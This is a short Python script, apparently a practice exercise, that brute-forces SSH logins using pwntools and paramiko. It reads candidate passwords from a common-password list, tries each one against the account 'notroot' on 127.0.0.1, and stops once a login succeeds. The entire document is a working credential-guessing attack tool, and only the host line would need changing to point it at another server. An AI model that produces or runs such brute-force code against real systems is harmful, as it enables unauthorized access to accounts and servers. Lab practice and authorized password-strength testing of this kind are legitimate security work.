from pwn import *
import paramiko

host = '127.0.0.1'
username = 'notroot'
attempts = 0

with open('ssh-common-passwords.txt', 'r') as password_list:
    for password in password_list:
        password = password.strip('\n')
        try:
            print(f'{attempts} Attempting password: {password}!')
            response = ssh(host=host, user=username, password=password, timeout=1)
            if response.connected():
                print('valid password found')
                response.close()
                break
        except paramiko.ssh_exception.AuthenticationException:
            print('[x] Invalid password!')
            attempts += 1
